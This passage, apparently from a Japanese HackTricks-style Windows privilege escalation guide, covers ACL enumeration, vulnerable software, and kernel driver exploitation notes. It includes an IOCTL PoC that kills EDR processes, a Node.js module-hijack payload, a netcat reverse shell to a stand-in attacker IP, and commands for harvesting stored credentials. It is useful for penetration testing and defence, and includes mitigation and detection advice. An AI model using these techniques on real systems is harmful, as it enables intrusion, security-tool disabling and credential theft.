オプションの Windows Driver Kit には `StandaloneRunner.exe` が含まれており、実行ディレクトリにある `command.txt`、`reboot.rsf`、およびプロジェクトの `working\rsf.rsf` ファイルを読み込むことがあります。特権アカウントでこのヘルパーを起動するスケジュールタスクまたはサービスがあると、ヘルパーの実行ファイル自体が保護されていても、これらの入力ファイルへの低権限での書き込みアクセスが、そのアカウントのコンテキストでのコマンド実行につながる可能性があります。特権で実行する側が存在することと、**両方の**サイドカーファイルを作成または変更できることを確認してください。ヘルパーが見つかっただけでは不十分です。

スケジュールタスクの場合は、アクションの [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) と、2 つのサイドカーファイルのパスに対する ACL を確認してください。タスクに作業ディレクトリが指定されていない場合、実行ファイルのディレクトリは確認すべき手掛かりにすぎず、タスクがそこから入力を読み込む証拠にはなりません。プロジェクトの作業ファイルに関する前提条件も満たされている必要があります。SYSTEM で実行されると決めつけず、実際のタスクプリンシパルを確認してください。

## アプリケーション

### インストール済みアプリケーション

**バイナリの権限**（上書きして privilege escalation できる可能性があります）と、**フォルダーの権限**（[DLL Hijacking](dll-hijacking/index.html)）を確認してください。

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent の修復処理

[CVE-2024-0670](https://checkmk.com/werk/16361) は、コマンドファイルを `C:\Windows\Temp` に書き込み、置き換えに失敗すると既存の書き込み保護されたファイルを実行していた古い Checkmk Windows agent に影響します。ベンダーは 2.1.0p40、2.2.0p23、2.3.0b1、2.4.0b1 でこの問題を修正しました。インストールされている正確なパッチレベルと、影響を受ける agent の処理を実行できるかを確認してください。`2.1` のようにブランチしか分からない表示では、影響の有無を判断できません。列挙では、ファイルの作成や agent コマンドの実行をせずに、バージョン、サービスの状態、Temp のアクセス許可を確認できます。

#### ADSelfService Plus SAML サービスの確認

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) は、ADSelfService Plus のビルド 6210 以前に影響し、ベンダーはビルド 6211 で修正しました。この問題が関係するのは、SAML SSO が**現在または過去に**有効だった場合のみです。そのため、インストール済み製品の情報やサービスのパスは手掛かりにすぎず、脆弱性の判定材料にはなりません。正確なビルド、SAML 設定の履歴、サービスへのネットワーク到達性、実行アカウントを確認してください。サービス経由でのコード実行は、そのアカウントの権限を引き継ぎます。SYSTEM 権限で実行されるのは、SYSTEM で動作するインスタンスの場合のみです。製品の Backup ディレクトリにある読み取り可能な `OfflineBackup_*.ezip` は、別個の暗号化バックアップに関する手掛かりであり、利用可能な認証情報や、この SAML の脆弱性を示す証拠ではありません。通常の列挙では展開せず、パスとアクセス権のみを記録してください。

#### Jenkins controller とドメインアカウントの境界

Windows Jenkins controller では、ジョブの作成・設定権限と起動権限を区別してください。[Jenkins のドキュメントでは、これらは `Job/Create`、`Job/Configure`、`Job/Build` という別々の権限として説明されています](https://www.jenkins.io/doc/book/security/access-control/permissions/)。設定済みのスケジュールやリモートトリガーからもビルドを実行できる場合がありますが、その機能が有効であり、実際にビルドが実行されることを確認してください。実行時の ID は controller または選択された agent のものになり、保存済みの認証情報を使用できるのは、ジョブがそのスコープにアクセスできる場合のみです。これとは別に、`JENKINS_HOME` のメタデータへのアクセスを確認してください。Jenkins は認証情報のデータや暗号化キーを `credentials.xml`、`secrets/hudson.util.Secret`、`secrets/master.key` に保存します（[Jenkins のシークレットストレージ](https://www.jenkins.io/doc/developer/security/secrets/)）。これらのファイルが存在するだけでは、パスワードが分かるわけではありません。共有出力にシークレットを表示せず、**必要なファイルへの読み取りアクセス権**と、別個のアカウント再利用経路を確認してください。そのアカウントが AD ユーザーオブジェクトの `scriptPath` に対する書き込み権限を持つ場合は、書き込み可能なスクリプトパスと、対象ユーザーとして実行される実際のログオン処理またはスケジュール済みの実行主体を確認してから、ユーザーをまたぐ実行と判断してください。さらにグループを制御できるかどうかは、AD の有効な権限を個別に確認する必要があります。

#### Azure Pipelines のセルフホスト agent の実行 ID

Azure DevOps Server または Azure Pipelines のプロジェクトでは、パイプラインの**作成・編集**権限と、パイプラインの**キュー登録**および選択された agent pool の使用権限を区別してください。[Microsoft はパイプラインの権限](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops)と[pool の承認](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops)を別々に説明しています。低権限アカウントがスクリプトステップを送信し、そのパイプラインをセルフホスト Windows agent で実行できる場合、そのステップは[agent に設定された OS アカウント](https://learn.microsoft.com/azure/devops/pipelines/agents/agents)として実行されます。ユーザーをまたぐ権限昇格や SYSTEM への移行を主張する前に、正確なパイプライン、ブランチ／リソースの制限、承認済みの pool、実行可能なジョブ、agent サービスの実行 ID を確認してください。agent のインストール、プロジェクトのロール、リポジトリへの書き込み権限だけでは、手掛かりにすぎません。受動的な列挙では、ビルドを開始せずに権限とローカルサービスのメタデータを確認してください。

#### Microsoft Entra Connect Sync の認証情報

[Microsoft は](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions)、同期サービスを実行して SQL データベースにアクセスする **ADSync サービスアカウント**と、権限が設定済みの同期機能によって異なる **AD DS connector アカウント**を区別しています。connector の認証情報はデータベース内に暗号化して保存され、鍵の情報は[ADSync サービスアカウントでの DPAPI によって保護されています](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account)。同期サービスがインストールされていること、ローカル管理者を連想させるグループがあること、データベースを参照できることだけでは、復号可能な認証情報やドメイン権限昇格があるとは判断できません。実際のデータベース読み取り権限、サービスアカウント／鍵へのアクセス、インストールと SQL の配置、設定済みの connector ID、その ID が持つ AD の有効な権限を、それぞれ確認してください。通常の列挙ではサービスとアクセス権のメタデータだけを表示し、保存されたシークレットの照会や出力は行わないでください。

#### プリンタードライバーのサポート DLL のアクセス許可

インストール済みのプリンタードライバーは、`C:\ProgramData` 以下にサポート DLL を置き、より高い権限で動作する印刷プロセス内で読み込むことがあります。プリンターの WMI 列挙が拒否されても、親ディレクトリや reparse point を含め、該当するドライバーのディレクトリと DLL の ACL を確認してください。[Ricoh のプリンタードライバーに関する問題 CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1)で報告されたパスは `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` でした。[元の報告](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/)では、`PrintIsolationHost.exe` による DLL の読み込みが説明されています。書き込み可能な ACL は手掛かりにすぎません。拒否エントリを考慮した実効的な書き込み権限、該当するドライバーがインストールされており、特権のある ID でそのファイルを読み込むこと、さらにベンダーの更新済みドライバーやセキュリティプログラムでインストールが修正されているかを確認してください。ディレクトリ名やドライバーのバージョンだけから、脆弱性があると判断しないでください。

### 書き込み権限

特別なファイルを読み取るために設定ファイルを変更できるか、または Administrator アカウントで実行されるバイナリ（schedtasks）を変更できるかを確認してください。

システム内のアクセス許可が弱いフォルダー／ファイルを見つける方法の 1 つは、次のとおりです。

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ は `plugins` サブフォルダーにあるすべてのプラグイン DLL を自動的に読み込みます。書き込み可能なポータブル版またはコピー版がインストールされている場合、悪意のあるプラグインを配置すると、起動するたびに `notepad++.exe` 内でコードが自動実行されます（`DllMain` やプラグインのコールバックからも実行されます）。

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 起動時に実行

**別のユーザーによって実行されるレジストリ項目やバイナリを上書きできるか確認してください。**\
**権限昇格につながる興味深い autoruns の場所**について詳しく知るには、**以下のページを読んでください**。


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ドライバー

**サードパーティ製の不審な/脆弱な**ドライバーがないか探してください。

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

ドライバーが任意の kernel read/write primitive（設計の不十分な IOCTL handler でよく見られます）を公開している場合、kernel memory から SYSTEM token を直接盗むことで privilege escalation できます。<sup>[[13]](#references)</sup> 手順を追った technique はこちらを参照してください。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

脆弱な呼び出しが攻撃者制御の Object Manager path を開く race-condition bug では、lookup を意図的に遅らせる（最大長の component や深い directory chain を使う）ことで、実行可能な時間幅を数マイクロ秒から数十マイクロ秒に延ばせます。

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF、paged-pool disclosure、I/O ring pivot

Windows kernel LPE chain の中には、個別には弱い2つの bug から構成できるものがあります。1つは、queue lock が保持されたまま request/CBD を解放する **cancel-safe queue lifetime race**、もう1つは、`RtlCopyToUser` 中に解放済みの paged-pool allocation の内容が漏れる **lock-release-before-copy disclosure** です。<sup>[[29]](#references)</sup>

監査と exploit のメモ:

- **lock 保持中に解放し、その後 cancel**: success path が **Acquire -> CompleteRequest/free -> Release** の順に処理し、cancel path が **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** の順に処理する箇所を探してください。success path が CBDQ/CSQ lock を解放する前に `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` に到達すると、`NtCancelIoFileEx -> IopCsqCancelRoutine` で待機していた thread が後から再開し、解放済みの `PFLT_CALLBACK_DATA` をドライバーの remove callback に渡す可能性があります。
- **解放済みの queue object を再確保**: 同じサイズで攻撃者が制御できる paged-pool allocation を使います。`NPFS` Data Queue Entry は、payload とサイズを制御でき、後から pipe read/peek operation で調べられるため有用です。解放済みの object に list link が含まれている場合は、それらを**user memory 上の fake request node の循環 list**で上書きします。これにより、ドライバーは元の list head で停止せず、攻撃者が定義した request structure を繰り返し処理します。
- **予測可能な write を強化**: fake request が bookkeeping write（timestamp / QPC / refcount 近傍の field）に使われる nested context pointer を変更できる場合、**書き込み先の address は制御できるが、値は制御できない** kernel write を得られることがあります。その場合は、最後に書き換える code/data pointer ではなく、spray した pool object の **length/size** field を標的にし、破損した object から **out-of-bounds paged-pool read** が発生するまで spray を列挙します。
- **race 可能な disclosure のパターン**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` を実行する syscall は、いずれも有力な候補です。攻撃者がコピー対象の buffer を拡大できる場合（たとえば、serializer の最終 allocation size を増やす list/resource entry を多数追加するなど）、マシンをクラッシュさせずにコピー時間を延ばして、replacement window を広げられるため、成功率が向上します。
- **pointer を多く含む refill target**: Windows **I/O ring** の registered-buffer array は優れた disclosure target です。paged-pool のサイズ（`8 * regBufferCnt`）を攻撃者が制御でき、各 element が `_IOP_MC_BUFFER_ENTRY` への kernel pointer だからです。array を1つ leak し、周囲の `IORING_OBJECT` を特定したら、**`RegBuffers`** と **`RegBuffersCount`** を破損させます。これにより、後続の I/O ring operation が攻撃者の偽造した entry を使い、任意の kernel read/write を実行できるようになります。利用可能な write が安定した byte（たとえば `KUSER_SHARED_DATA+0x14` の値）しか書けない場合は、**重なり合う非アライン write** を使って `0x0101010101010101` のような同じ byte の繰り返しからなる user pointer を作り、`VirtualAlloc` でそのアドレスを map して、偽造した registered-buffer array を配置します。<sup>[[30]](#references)</sup>

デバッグ時に役立つ指標:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once corrupted I/O ringからarbitrary kernel read/writeを取得したら、標準的なpost-primitive workflowを使ってSYSTEM tokenを盗みます。

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hiveのメモリ破損primitive

最新のhive脆弱性では、決定論的なメモリ配置を整え、書き込み可能なHKLM/HKUの子キーを悪用し、カスタムdriverなしでメタデータの破損をkernel paged-pool overflowに変換できます。攻撃の全手順はこちら：

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### 攻撃者が制御するパスによる`RtlQueryRegistryValues` direct-modeのtype confusion

一部のdriverはuserlandからregistry pathを受け取り、それが妥当なUTF-16文字列であることだけを検証してから、`RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)`を呼び出し、`RTL_QUERY_REGISTRY_DIRECT`で`int readValue`のようなstack scalarに値を書き込みます。`RTL_QUERY_REGISTRY_TYPECHECK`が指定されていない場合、`EntryContext`は開発者が想定した型ではなく、registryの**実際の**型に基づいて解釈されます。

これにより、次の2つの有用なprimitiveが生まれます：<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**：ユーザー制御の絶対パス`\Registry\...`を使って、driverに攻撃者が選んだキーを照会させ、戻り値やログからキーの存在を漏らし、場合によっては呼び出し元が直接アクセスできない値を読み取れます。
- **Kernel memory corruption**：`&readValue`のようなscalarの格納先が、registry値の型に応じて`REG_QWORD`、`UNICODE_STRING`、またはサイズ指定のバイナリバッファとしてtype confusionを起こします。

実際の攻撃に関する注意点：

- **Windows 8以降の緩和策**：`RTL_QUERY_REGISTRY_TYPECHECK`なしで`RTL_QUERY_REGISTRY_DIRECT`を使い、**untrusted hive**を照会すると、kernel callerは`KERNEL_SECURITY_CHECK_FAILURE (0x139)`でクラッシュします。攻撃可能性を保つには、値を`HKCU`の下に用意するのではなく、**trusted system hive内の攻撃者が書き込み可能なキー**を探してください。
- **Trusted-hiveへの値の用意**：NtObjectManagerを使って`\Registry\Machine`配下の書き込み可能な子孫キーを列挙し、複製した**low-integrity** tokenを使ってスキャンを再実行し、sandbox化されたコンテキストからアクセス可能なキーを探します：<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byteの`int`への8-byteの直接書き込みは、隣接するスタックデータを破損させ、近くのcallback/function pointerを部分的に上書きする可能性があります。
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct modeでは、`EntryContext`が`UNICODE_STRING`を指していることを想定します。コードが攻撃者制御の`REG_DWORD`をスタックスカラーに読み込んだ後、同じバッファを文字列読み込みに再利用すると、攻撃者が`Length`/`MaximumLength`を制御し、`Buffer`ポインターにも部分的に影響を与えられるため、半制御のkernel writeが可能になります。
- **`REG_BINARY`**: 大きなバイナリデータの場合、direct modeは`EntryContext`の先頭にある`LONG`を符号付きバッファサイズとして扱います。以前の`REG_DWORD`読み込みによって、再利用されたスカラーに攻撃者制御の**負の値**が残っていると、次の`REG_BINARY`クエリで攻撃者のバイト列が隣接するスタックスロットに直接コピーされます。これは多くの場合、callback pointerを完全に上書きする最も簡単な方法です。

有力な調査パターン: **再初期化せずに、同じスタック変数へ異なる型のレジストリ値を読み込むこと**。`RTL_REGISTRY_ABSOLUTE`、`RTL_QUERY_REGISTRY_DIRECT`、再利用される`EntryContext`ポインター、最初のレジストリ読み込みによって2回目の読み込みが実行されるかどうかが決まるコードパスをgrepしてください。

#### device objectでのFILE_DEVICE_SECURE_OPEN設定漏れの悪用（LPE + EDR kill）

一部の署名済みサードパーティードライバーは、IoCreateDeviceSecureを使って強力なSDDLを設定してdevice objectを作成するものの、DeviceCharacteristicsにFILE_DEVICE_SECURE_OPENを設定し忘れます。このフラグがないと、余分なコンポーネントを含むパスからdeviceを開いた際に、セキュアなDACLが適用されません。そのため、権限のないユーザーでも、次のようなnamespace pathを使ってhandleを取得できます。<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile（実際に確認された事例）

ユーザーがdeviceを開けると、そのドライバーが公開する特権IOCTLを悪用してLPEや改ざんを行えます。実環境で確認された機能の例:
- 任意のプロセスに対するフルアクセスhandleの返却（token theft / DuplicateTokenEx/CreateProcessAsUserを使ったSYSTEM shell）。
- 制限のないraw disk read/write（オフラインでの改ざん、ブート時の永続化手法）。
- Protected Process/Light（PP/PPL）を含む任意のプロセスの終了。これにより、kernel経由でuser landからAV/EDR killが可能になります。

最小限のPoCパターン（user mode）:
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

開発者向けの緩和策
- DACLで制限するデバイスオブジェクトを作成する際は、必ず FILE_DEVICE_SECURE_OPEN を設定してください。
- 特権操作では呼び出し元のコンテキストを検証してください。プロセスの終了やハンドルの返却を許可する前に、PP/PPL のチェックを追加してください。
- IOCTL を制限し（アクセスマスク、METHOD_*、入力検証）、カーネル権限を直接使うのではなく、ブローカー経由のモデルを検討してください。

防御側の検知案
- 不審なデバイス名（例：\\ .\\amsdk*）へのユーザーモードからのオープンや、悪用を示す特定の IOCTL シーケンスを監視してください。
- Microsoft の脆弱なドライバーのブロックリスト（HVCI/WDAC/Smart App Control）を適用し、独自の許可リスト／拒否リストも維持してください。


## PATH DLL Hijacking

**PATH 上にあるフォルダーへの書き込み権限**がある場合、プロセスによって読み込まれる DLL を乗っ取り、**権限を昇格**できる可能性があります。<sup>[[2]](#references)</sup>

PATH 内のすべてのフォルダーのアクセス許可を確認します:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

このチェックを悪用する方法について詳しくは、以下を参照してください。


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` を介した Node.js / Electron モジュール解決のハイジャック

これは、`require("foo")` のような bare import を実行した際に、想定されるモジュールが**見つからない**場合に **Node.js** および **Electron** アプリケーションに影響する、**Windows の制御されていない検索パス**の亜種です。<sup>[[20]](#references)</sup>

Node はディレクトリツリーを上にたどり、各親ディレクトリにある `node_modules` フォルダーを確認してパッケージを解決します。Windows では、この探索がドライブのルートまで到達する可能性があります。そのため、`C:\Users\Administrator\project\app.js` から起動されたアプリケーションは、次の場所を調べることがあります。<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**低権限ユーザー**が `C:\node_modules` を作成できる場合、悪意のある `foo.js`（またはパッケージフォルダー）を配置し、**より高い権限で動作する Node/Electron プロセス**が見つからない依存関係を解決するのを待つことができます。ペイロードは被害プロセスのセキュリティコンテキストで実行されるため、対象が管理者として実行されている場合、昇格されたスケジュールタスク／サービスラッパーから実行されている場合、または自動起動する特権デスクトップアプリの場合、これは **LPE** につながります。

これは特に次のような場合によく発生します。

- 依存関係が `optionalDependencies` に宣言されている<sup>[[22]](#references)</sup>
- サードパーティライブラリが `require("foo")` を `try/catch` で囲み、失敗しても処理を続行する
- パッケージが本番ビルドから削除された、パッケージ化時に含まれなかった、またはインストールに失敗した
- 脆弱な `require()` がメインアプリケーションのコードではなく、依存関係ツリーの深い場所にある

### 脆弱な対象の調査

**Procmon** を使って解決パスを確認します。<sup>[[23]](#references)</sup>

- `Process Name` = 対象の実行ファイル（`node.exe`、Electron アプリの EXE、またはラッパープロセス）でフィルターする
- `Path` が `node_modules` を `contains` する条件でフィルターする
- `NAME NOT FOUND` と、`C:\node_modules` で最後に成功したオープンに注目する

展開済みの `.asar` ファイルやアプリケーションのソースで役立つコードレビューのパターン：

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon またはソースの確認から、**不足しているパッケージ名**を特定します。
2. まだ存在しない場合は、root の検索ディレクトリを作成します。

```powershell
mkdir C:\node_modules
```

3. 想定される名前と完全に一致するモジュールを配置する：

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. victim applicationを起動します。アプリケーションが`require("foo")`を試み、正規のモジュールが存在しない場合、Nodeは`C:\node_modules\foo.js`を読み込むことがあります。

このパターンに当てはまる、実際に使われている欠落したoptional moduleの例として`bluebird`や`utf-8-validate`があります。ただし、再利用可能な部分は**technique**です。特権で動作するWindows Node/Electronプロセスが解決する、欠落した**bare import**を見つけてください。

### 検知とhardeningのアイデア

- ユーザーが`C:\node_modules`を作成したり、新しい`.js`ファイルやpackageを書き込んだりした場合にalertを出します。
- `C:\node_modules\*`から読み込んでいるhigh-integrity processを調査します。
- 本番環境ではすべてのruntime dependencyをpackageに含め、`optionalDependencies`の使用状況を監査します。
- サードパーティ製コードに、エラーを無視する`try { require("...") } catch {}`パターンがないか確認します。
- libraryが対応している場合はoptional probeを無効にします（たとえば、`ws`の一部の導入環境では`WS_NO_UTF_8_VALIDATE=1`を使って、レガシーな`utf-8-validate`のprobeを回避できます）。

## ネットワーク

### 共有folder

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hostsファイル

hostsファイルにハードコードされている、ほかの既知のコンピューターを確認します。

```
type C:\Windows\System32\drivers\etc\hosts
```

### ネットワークインターフェースと DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### 開いているポート

外部から**制限されたサービス**を確認する

```bash
netstat -ano #Opened ports?
```

ローカルリスナーについては、PIDをプロセスの所有者、実行ファイルのパス、および起動元のサービスやスケジュールタスクと照合します。リモート制御サービスからデスクトップユーザーとしてアクセスできるかどうかは、その認証とコマンド制御の設定によります。より高い権限を持つアカウントで実行されるカスタムTCPアプリケーションは、別途調査すべき対象です。リスナーとバイナリのパスは受動的な手がかりにすぎません。認証を必要とするメモリ破損経由の攻撃経路を確認するには、その正確なバイナリと到達可能な入力を分析する必要があります。公開ポートがシステムプロセスに属しているように見える場合、バックエンドサービスを特定する前に [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) と照合してください。転送ルールがあるだけでは、転送先に到達可能であることや脆弱であることの証明にはなりません。

### ルーティングテーブル

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP テーブル

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### ファイアウォール ルール

[**ファイアウォール関連のコマンドはこちらを確認してください**](../basic-cmd-for-pentesters.md#firewall) **（ルールの一覧表示、ルールの作成、無効化、無効化など）**

[ネットワークの列挙に関するコマンドはこちら](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

バイナリの `bash.exe` は `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` にもあります。

root ユーザーを取得すると、任意のポートでリッスンできます（初めて `nc.exe` を使ってポートをリッスンするとき、ファイアウォールで `nc` を許可するかどうかをGUIで尋ねられます）。

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

bashをrootとして簡単に起動するには、`--default-user root`を試してください。

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`フォルダーで`WSL`のファイルシステムを確認できます。

WSL内のLinuxの`root`権限だけでは、WindowsのAdministrator権限は得られません。現在のWindows IDでディストリビューションのファイルシステムを読み取れる場合は、`/root/.bash_history`を含むシェル履歴ファイルを調べ、認証情報が記録された可能性のあるコマンドを確認してください。ただし、権限昇格には、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs`という構成は古いWSLインストールに当てはまります。WSL 2では、通常、ディストリビューションは[`ext4.vhdx`仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力するのは避けてください。

## Windows認証情報

### Winlogon認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。`DefaultPassword` または `AltDefaultPassword` に空でない値があれば、レジストリ内に平文の認証情報が存在することを示します。`AutoAdminLogon=1` でも、平文のパスワードを読み取れない場合は、あくまで手がかりにとどまります。[Sysinternals Autologon はパスワードを LSA secret として保存できます](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン設定を確認してください。

### 資格情報マネージャー / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault は、サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。**Windows** はその認証情報を使って、**ユーザーを自動的にログインさせる**ことができます。一見すると、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーに自動ログインさせられるように思えるかもしれませんが、実際はそうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるために使う認証情報を保存します。つまり、リソース（サーバーまたはWebサイト）にアクセスするために認証情報を必要とする**Windows アプリケーションは、この Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使うことができます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を使うことはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で**credential manager と通信し、そのリソースの認証情報をデフォルトのストレージ vault に要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された認証情報を使うために、`runas` の `/savecred` オプションを使用できます。次の例では、SMB share 経由でリモートバイナリを実行しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使って`runas`を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)も利用できます。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、最新のシステムサービスは、認証トークンや平文パスワードを Universal Windows Platform (UWP) の `PasswordVault` 内に保存します（`vaultcmd` では `Web Credentials` としても表示されます）。この保存領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` 権限がなくても、ネイティブに復号できます。

